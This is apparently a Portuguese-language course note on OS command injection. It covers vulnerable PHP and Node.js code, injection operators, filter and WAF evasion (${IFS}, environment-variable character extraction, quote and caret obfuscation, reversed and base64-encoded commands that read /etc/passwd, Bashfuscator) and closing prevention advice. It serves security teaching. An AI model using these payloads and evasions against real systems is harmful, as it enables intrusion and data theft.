# 💉 COMMAND INJECTION (INJEÇÃO DE COMANDOS)

## ❓ O que é Injeção?

Vulnerabilidades de **injeção** ficaram entre as mais críticas do **OWASP Top 10**.
Esse tipo de falha acontece quando uma entrada fornecida pelo usuário é:

* mal interpretada pela aplicação;
* utilizada de forma insegura;
* ou permite alterar a lógica esperada do sistema.

O resultado final é um comportamento diferente do que a aplicação deveria executar.

---

# 🧩 Principais Tipos de Injeção

## 1. Injeção de Comando no SO (Command Injection)

Permite executar comandos diretamente no sistema operacional.

Exemplo:

```bash id="17lxb7"
; whoami
```

---

## 2. Injeção de Código

O atacante injeta código que será interpretado pela aplicação.

Exemplo:

```php id="jzp4c7"
<?php phpinfo(); ?>
```

---

## 3. SQL Injection

Permite manipular consultas ao banco de dados.

Exemplo:

```sql id="2c2pop"
' OR '1'='1
```

---

## 4. XSS / HTML Injection

Permite injetar código HTML ou JavaScript em páginas web.

Exemplo:

```html id="1eeyd6"
<script>alert(1)</script>
```

---

# 💻 Injeção de Comando no SO

## ❓ O que é?

A **Command Injection** ocorre quando a aplicação executa comandos do sistema operacional utilizando dados controlados pelo usuário.

Essa é considerada uma falha extremamente grave porque pode permitir:

* execução remota de comandos;
* leitura de arquivos sensíveis;
* controle total do servidor;
* movimentação lateral;
* escalada de privilégios.

---

# ⚠️ Por que essa vulnerabilidade existe?

Muitas linguagens possuem funções capazes de executar comandos diretamente no sistema operacional.

## Exemplos de funções perigosas

### C

```c id="gyf36l"
execve()
```

### PHP

```php id="8lpup4"
system()
```

### Python

```python id="eg1tj6"
os.system()
```

### Node.js

```javascript id="fmg8li"
child_process.exec()
child_process.spawn()
```

---

# 🔥 Como a vulnerabilidade acontece?

O problema ocorre quando a aplicação:

1. recebe um input do usuário;
2. concatena esse input em um comando do sistema;
3. executa o comando sem validação ou sanitização.

---

# 🐘 Exemplo Vulnerável em PHP

```php id="2rbve8"
<?php
if (isset($_GET['filename'])) {
    system("touch /tmp/" . $_GET['filename'] . ".pdf");
}
?>
```

## O que esse código faz?

Ele pega um parâmetro da URL:

```http id="ih122h"
?filename=teste
```

E executa:

```bash id="ilefw6"
touch /tmp/teste.pdf
```

---

## 🚨 Qual é o problema?

O valor enviado pelo usuário:

* não é higienizado;
* não é sanitizado;
* é concatenado diretamente no comando.

---

## 💣 Possível exploração

Se o atacante enviar:

```http id="pz33cq"
?filename=teste;whoami
```

O comando executado pode virar:

```bash id="z7uv9r"
touch /tmp/teste;whoami.pdf
```

Dependendo do ambiente e da forma de execução, isso pode permitir execução arbitrária de comandos.

---

# 🟩 Exemplo Vulnerável em Node.js

```javascript id="8eisqa"
app.get("/createfile", function(req, res){
    child_process.exec(`touch /tmp/${req.query.filename}.txt`);
})
```

---

## 🚨 Problema

O parâmetro:

```javascript id="a8mk0v"
req.query.filename
```

vem diretamente da URL e é inserido no comando sem validação.

---

# 💥 EXPLORAÇÃO

# 🔍 Detecção

A detecção de **Command Injection** é semelhante a outros tipos de injeção.

A ideia principal é:

1. enviar um input controlado;
2. observar a resposta da aplicação;
3. identificar mudanças de comportamento.

---

## 🧪 Como funciona?

O payload normalmente é construído gradualmente.

Exemplo:

```text
teste
teste;id
teste&&whoami
```

O atacante adiciona pequenos operadores até confirmar que comandos estão sendo executados.

---

# 🛠️ Métodos de Injeção

Os operadores abaixo permitem adicionar comandos extras ao comando original da aplicação.

| Operador | URL Encode  | Funcionamento                                     |                                                      |                                                |
| -------- | ----------- | ------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------- |
| `;`      | `%3b`       | Executa ambos os comandos                         |                                                      |                                                |
| `\n`     | `%0a`       | Executa ambos                                     |                                                      |                                                |
| `&`      | `%26`       | Executa ambos                                     |                                                      |                                                |
| `        | `           | `%7c`                                             | Executa ambos, mas geralmente exibe apenas o segundo |                                                |
| `&&`     | `%26%26`    | Executa o segundo somente se o primeiro funcionar |                                                      |                                                |
| `        |             | `                                                 | `%7c%7c`                                             | Executa o segundo somente se o primeiro falhar |
| ` ` ``   | `%60%60`    | Executa comando dentro das crases (Linux)         |                                                      |                                                |
| `$()`    | `%24%28%29` | Substituição de comando (Linux)                   |                                                      |                                                |

---

## ⚠️ Observações

### `;`

Não funciona no ambiente **CMD do Windows**.

---

## 🧩 Estrutura do Payload

Geralmente utilizamos:

```text
input esperado + operador + payload
```

Exemplo:

```text
127.0.0.1;whoami
```

---

# 🌐 Validações no Frontend

## 🔎 Como identificar?

Uma validação feita apenas no frontend normalmente:

* NÃO gera nova requisição;
* ocorre apenas no navegador;
* pode ser facilmente burlada.

---

## ⚠️ Problema

Em alguns casos:

* o frontend valida;
* mas o backend NÃO sanitiza nada.

Isso cria uma falsa sensação de segurança.

---

## 🛠️ Como burlar?

Ferramentas comuns:

* Burp Suite
* Caido

Essas ferramentas permitem:

* interceptar requests;
* modificar parâmetros;
* reenviar payloads maliciosos.

---

# 🛡️ Evasão de Filtros

# 🔥 Identificando WAFs

## O que é um WAF?

WAF = **Web Application Firewall**

Ele tenta bloquear payloads maliciosos antes que cheguem na aplicação.

---

## 🧠 Como identificar?

Um possível indicativo:

* a mensagem de erro aparece em uma página diferente;
* pode conter:

  * IP;
  * request;
  * identificadores de bloqueio.

---

# 🚫 Blacklist

Algumas aplicações usam listas de caracteres proibidos.

Exemplo:

```php
$blacklist = ['&', '|', ';', ...SNIP...];

foreach ($blacklist as $character) {
    if (strpos($_POST['ip'], $character) !== false) {
        echo "Invalid input";
    }
}
```

---

## 🔍 Como descobrir a blacklist?

Enviar apenas UM caractere por vez:

```text
;
&
|
$
```

E observar:

* quais retornam erro;
* quais passam normalmente.

---

# 🧠 Bypass de Blacklist

## 📚 Referência útil

[PayloadsAllTheThings — Command Injection Bypass](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection?utm_source=chatgpt.com#bypass-without-space)

---

## 💡 Conceito importante

Ao entender o fundamento do bypass:

* fica muito mais fácil pesquisar novas técnicas;
* adaptar payloads;
* criar evasões próprias.

---

# ↩️ Bypass com Nova Linha (`\n`)

Algumas aplicações NÃO bloqueiam:

```text
\n
```

Porque esse caractere pode ser utilizado internamente pela própria aplicação.

---

## ✅ Vantagem

Funciona tanto em:

* Linux
* Windows

---

# ␠ Bypass de Espaço

## ❓ Por que espaço é bloqueado?

Muitos inputs não esperam espaços.

Exemplo:

```text
IP
nome de arquivo
hostname
```

Então filtros frequentemente bloqueiam `" "`.

---

# 🧩 Técnicas de Bypass de Espaço

## 1. TAB (`%09`)

Substitui o espaço usando tabulação.

```text
cat%09/etc/passwd
```

---

## 2. `${IFS}` (Linux)

`IFS` = Internal Field Separator

Por padrão contém espaço.

Exemplo:

```bash
cat${IFS}/etc/passwd
```

---

## 3. Bash Brace Expansion

```bash
{ls,-la}
```

O Bash interpreta isso como:

```bash
ls -la
```

---

# 🔪 Bypass de Barra, Ponto e Vírgula (`/ ; \`)

## 🧠 Ideia

Utilizar variáveis de ambiente para recuperar caracteres específicos.

---

# 🌍 Variáveis de Ambiente Linux

Exemplos:

```bash
PATH
HOME
PWD
LS_COLORS
```

---

## Exemplo

```bash
echo ${PATH}
```

Essas variáveis possuem muitos caracteres úteis.

---

# 📌 Manipulando como Array

## Recuperando `/`

```bash
${PATH:0:1}
```

### Explicação

* começa na posição `0`;
* pega `1` caractere.

Resultado:

```text
/
```

---

## Recuperando `;`

```bash
${LS_COLORS:10:1}
```

---

# 🪟 Windows

O mesmo conceito funciona usando variáveis do Windows.

---

## CMD

### Exemplo

```cmd
%HOMEPATH%
```

Resultado:

```text
\Users\htb-student
```

---

## Recuperando `\`

```cmd
echo %HOMEPATH:~6,-11%
```

---

## Explicação

* começa na posição `6`;
* remove `11` caracteres do final.

Resultado:

```text
\
```

---

# 🔵 PowerShell

## Recuperando caracteres

```powershell
$env:HOMEPATH[0]
```

---

## Listando variáveis de ambiente

```powershell
Get-ChildItem Env:
```

---

# 🔄 Shifting Characters

## 🧠 Conceito

Essa técnica usa a tabela ASCII.

Passos:

1. encontrar o caractere desejado;
2. pegar o caractere anterior;
3. deslocar o valor em +1.

---

## Exemplo

### Caractere desejado

```text
\ = ASCII 92
```

### Caractere anterior

```text
[ = ASCII 91
```

---

## Payload

```bash
echo $(tr '!-}' '"-~'<<<[)
```

---

## 🔍 O que acontece?

O comando `tr` desloca os caracteres em +1.

Resultado final:

```text
\
```

---

# 📌 Resumo Rápido

| Técnica               | Objetivo                        |                    |
| --------------------- | ------------------------------- | ------------------ |
| `;`, `&&`, `          | `                               | Adicionar comandos |
| `%0a`                 | Usar nova linha                 |                    |
| `${IFS}`              | Substituir espaço               |                    |
| `%09`                 | TAB no lugar de espaço          |                    |
| Brace Expansion       | Criar espaço automaticamente    |                    |
| Variáveis de ambiente | Recuperar caracteres bloqueados |                    |
| ASCII Shifting        | Gerar caracteres proibidos      |                    |
| Burp/Caido            | Burlar validações frontend      |                    |

---

# 🚫 COMANDOS NA BLACKLIST

# 🧠 O que é Blacklist de Comandos?

Blacklist de comandos consiste em uma lista de palavras bloqueadas pela aplicação.

Exemplo:

```php id="17k4s7"
$blacklist = ['whoami', 'cat', ...SNIP...];

foreach ($blacklist as $word) {
    if (strpos($_POST['ip'], $word) !== false) {
        echo "Invalid input";
    }
}
```

---

## 🎯 Objetivo do atacante

O objetivo é:

* modificar visualmente o comando;
* sem alterar sua execução real.

Ou seja:

```text id="hsvzv0"
"parecer diferente" para o filtro
"continuar igual" para o sistema operacional
```

---

# 🛠️ Técnicas de Bypass

# ✨ Uso de Aspas (`'` e `"`)

Podemos adicionar caracteres que NÃO interferem na execução do comando.

---

## Exemplos

### Aspas simples

```bash id="m9ul7l"
w'h'o'am'i
```

---

### Aspas duplas

```bash id="4i5xf2"
w"h"o"am"i
```

---

## ⚠️ Regras importantes

* NÃO misturar aspas simples e duplas;
* a quantidade precisa ser PAR.

---

## ✅ Compatibilidade

Funciona em:

* Linux
* Windows

---

# 🐧 Bypass com `\` e `$@` (Linux)

## Barra invertida (`\`)

```bash id="0x6v7y"
w\ho\am\i
```

---

## `$@`

```bash id="a9vr0h"
who$@ami
```

---

## 🧠 Observações

* funciona apenas no Linux;
* não precisa ser par;
* quebra a assinatura do comando.

---

# 🪟 Bypass com `^` (Windows)

```cmd id="h6c1af"
who^ami
```

---

## ⚠️ Compatibilidade

Funciona apenas no Windows CMD.

---

# 💣 Exemplo Completo de Payload

```text id="yd5k8i"
ip=127.0.0.1%0a{ca$@t,${PATH:0:1}h$@ome${PATH:0:1}1nj3c70r${PATH:0:1}fl$@ag.txt}
```

---

## 🔍 Técnicas utilizadas

Esse payload combina:

| Técnica       | Objetivo         |
| ------------- | ---------------- |
| `%0a`         | Nova linha       |
| `${PATH:0:1}` | Recuperar `/`    |
| `$@`          | Ofuscar comandos |
| `{}`          | Brace Expansion  |

---

# 🧬 Ofuscação Avançada de Comandos

## ⚠️ Importante

Técnicas simples podem falhar contra:

* WAFs avançados;
* filtros inteligentes;
* análise comportamental.

---

# 🔠 Alternar Maiúsculas e Minúsculas

## Exemplo

```bash id="8e4bsy"
WhOaMi
```

---

# 🪟 Windows

No Windows:

* CMD NÃO diferencia case;
* PowerShell NÃO diferencia case.

Então o comando funciona diretamente.

---

# 🐧 Linux

Linux diferencia maiúsculas de minúsculas.

Precisamos converter o texto antes da execução.

---

## Usando `tr`

```bash id="c7l4n5"
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
```

---

## ⚠️ Espaços podem ser bloqueados

Utilizar:

```text id="6ifg1d"
%09
```

no lugar de espaço.

---

## Usando variável Bash

```bash id="o2xyhu"
$(a="WhOaMi";printf %s "${a,,}")
```

---

# 🔄 Comando Invertido

## 🧠 Conceito

1. inverter o comando;
2. enviar invertido;
3. desinverter durante execução.

---

# 🐧 Linux

## Invertendo

```bash id="5e3pxf"
echo 'whoami' | rev
```

Resultado:

```text id="xxr6sz"
imaohw
```

---

## Desinvertendo e executando

```bash id="pf3vfy"
$(rev<<<'imaohw')
```

---

# 🪟 Windows

## Inverter string

```powershell id="yq38ee"
"whoami"[-1..-20] -join ''
```

---

## Reverter e executar

```powershell id="mjjbtx"
iex "$('imaohw'[-1..-20] -join '')"
```

---

# 🔐 Comandos Codificados

Podemos codificar payloads para evitar filtros.

---

# 📦 Base64 (Linux)

## Codificando

```bash id="4g0u0f"
echo -n 'cat /etc/passwd | grep 33' | base64
```

Resultado:

```text id="pvjzgr"
Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==
```

---

## Decodificando e executando

```bash id="j4r19y"
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
```

---

# 🪟 Base64 no Windows

## Converter para Base64

```powershell id="8s40gf"
[Convert]::ToBase64String(
[System.Text.Encoding]::Unicode.GetBytes('whoami'))
```

---

## Executar payload codificado

```powershell id="e8b9x4"
iex "$([System.Text.Encoding]::Unicode.GetString(
[System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

---

# 🤖 Ferramentas de Evasão

## ⚠️ Problema

Algumas vezes:

* a ofuscação manual não é suficiente;
* o payload fica muito complexo.

---

# 🐧 Bashfuscator (Linux)

Ferramenta automática de ofuscação Bash.

## Exemplo

```bash id="dlvql1"
bashfuscator -c 'cat /etc/passwd' -s 1 -t 1 --no-mangling --layers 1
```

---

# ⚙️ Parâmetros

| Parâmetro       | Função                        |
| --------------- | ----------------------------- |
| `-c`            | Comando que será ofuscado     |
| `-s 1`          | Tamanho do payload            |
| `-t 1`          | Complexidade da técnica       |
| `--no-mangling` | Não altera nomes de variáveis |
| `--layers 1`    | Camadas de ofuscação          |

---

## 📌 Escalas

### `-s` e `-t`

Valores:

```text id="s7ihj8"
1 → simples
2 → médio
3 → avançado
```

---

# ▶️ Executando o resultado

```bash id="u2m0n0"
bash -c "resultado_do_bashfuscator"
```

---

# 🛡️ Prevenção

# ✅ Evitar execução de comandos do sistema

Principalmente quando houver:

* input do usuário;
* concatenação dinâmica.

---

# ✅ Validar entrada do usuário

Utilizar:

* allowlist;
* regex;
* filtros integrados da linguagem.

---

# ✅ Sanitizar entradas

Sanitização significa:

```text id="85o70y"
remover caracteres especiais desnecessários
```

Exemplos perigosos:

```text id="a4l4mn"
;
|
&
$
`
```

---

# 📌 Resumo Rápido

| Técnica        | Objetivo                      |
| -------------- | ----------------------------- |
| `'` e `"`      | Quebrar assinatura do comando |
| `\` e `$@`     | Ofuscação Linux               |
| `^`            | Ofuscação Windows             |
| Case alternado | Burlar filtros simples        |
| `rev`          | Inverter comandos             |
| Base64         | Ocultar payload               |
| Bashfuscator   | Automatizar evasão            |

---

